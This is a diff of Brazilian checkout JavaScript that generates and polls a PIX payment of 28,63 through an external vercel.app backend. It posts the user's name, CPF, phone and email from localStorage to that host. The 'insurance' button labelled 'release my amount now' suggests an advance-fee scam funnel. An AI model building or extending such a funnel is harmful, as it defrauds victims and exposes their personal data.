@@ -925,16 +925,13 @@
 
                 const intervalo = setInterval(async () => {
                     try {
-                        const res = await fetch(`api/skale.php?id=${encodeURIComponent(transactionId)}`, {
-                            method: 'GET',
-                            headers: { 'Content-Type': 'application/json' }
-                        });
+                        const res = await fetch("https://recargajogoquiz.vercel.app/api/check_status?txid=" + encodeURIComponent(transactionId));
                         const data = await res.json();
 
-                        if (data.success && data.status === 'paid') {
+                        if (data.paid) {
                             clearInterval(intervalo);
                             if (pixStatusMsg) {
-                                pixStatusMsg.textContent = "✅ Pagamento confirmado! Redirecionando...";
+                                pixStatusMsg.textContent = "Pagamento confirmado! Redirecionando...";
                                 pixStatusMsg.style.color = "green";
                             }
                             setTimeout(() => {
@@ -942,7 +939,6 @@
                                 const cpf = encodeURIComponent((localStorage.getItem("cpfUsuario") || localStorage.getItem("cpf") || localStorage.getItem("document") || "").replace(/\D/g, ''));
                                 const phone = encodeURIComponent((localStorage.getItem("telephone") || localStorage.getItem("phone") || "").replace(/\D/g, ''));
 
-                                // Pega UTMs do localStorage ou URL atual
                                 const utmsParams = [];
                                 ['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(k => {
                                     const v = localStorage.getItem(k) || new URLSearchParams(window.location.search).get(k);
@@ -959,15 +955,58 @@
                 }, 5000);
             }
 
-            btnPayInsurance.addEventListener("click", (ev) => {
+            btnPayInsurance.addEventListener("click", async (ev) => {
                 if (ev && typeof ev.preventDefault === "function") ev.preventDefault();
                 if (btnPayInsurance.disabled) return;
                 btnPayInsurance.disabled = true;
-                const textoOriginal = btnPayInsurance.textContent;
-                btnPayInsurance.textContent = "Redirecionando...";
-                setTimeout(() => {
-                    window.location.href = "https://zuckpay.com.br/checkout/pagamento-pendente";
-                }, 1000);
+                btnPayInsurance.textContent = "Gerando PIX...";
+
+                try {
+                    const utms = {};
+                    ['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(k => {
+                        const v = localStorage.getItem(k) || new URLSearchParams(window.location.search).get(k);
+                        if (v) utms[k] = v;
+                    });
+
+                    const res = await fetch("https://recargajogoquiz.vercel.app/api/backend", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            amount: "28,63",
+                            nome: localStorage.getItem("nomeUsuario") || localStorage.getItem("name") || localStorage.getItem("nome") || "",
+                            cpf: (localStorage.getItem("cpfUsuario") || localStorage.getItem("cpf") || localStorage.getItem("document") || "").replace(/\D/g, ''),
+                            telefone: (localStorage.getItem("telephone") || localStorage.getItem("phone") || "").replace(/\D/g, ''),
+                            email: localStorage.getItem("email") || "",
+                            stage: "avaliacao04",
+                            ...utms
+                        })
+                    });
+                    const data = await res.json();
+                    const qr = data.qr_code || data.qrcode || (data.pix && data.pix.qrcode) || (data.data && data.data.pix && data.data.pix.qr_code);
+                    const txid = data.txid || data.id || (data.data && data.data.id);
+
+                    if (!res.ok || !qr) throw new Error(data.error || "Nao foi possivel gerar o PIX");
+
+                    const pixContainer = document.getElementById("pixContainer");
+                    document.getElementById("pixQrImage").src = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" + encodeURIComponent(qr);
+                    document.getElementById("pixCopiaCola").value = qr;
+                    pixContainer.classList.remove("hidden");
+                    btnPayInsurance.classList.add("hidden");
+                    pixContainer.scrollIntoView({ behavior: "smooth", block: "center" });
+
+                    if (txid) verificarPagamento(txid);
+                } catch (err) {
+                    console.error("Erro ao gerar PIX:", err);
+                    btnPayInsurance.disabled = false;
+                    btnPayInsurance.textContent = "LIBERAR MEU VALOR AGORA";
+                    const pixStatusMsg = document.getElementById("pixStatusMsg");
+                    const pixContainer = document.getElementById("pixContainer");
+                    pixContainer.classList.remove("hidden");
+                    if (pixStatusMsg) {
+                        pixStatusMsg.textContent = "Nao foi possivel gerar o PIX. Toque no botao para tentar de novo.";
+                        pixStatusMsg.style.color = "red";
+                    }
+                }
             });
 
 document.getElementById("btnCopiarPix").addEventListener("click", () => {
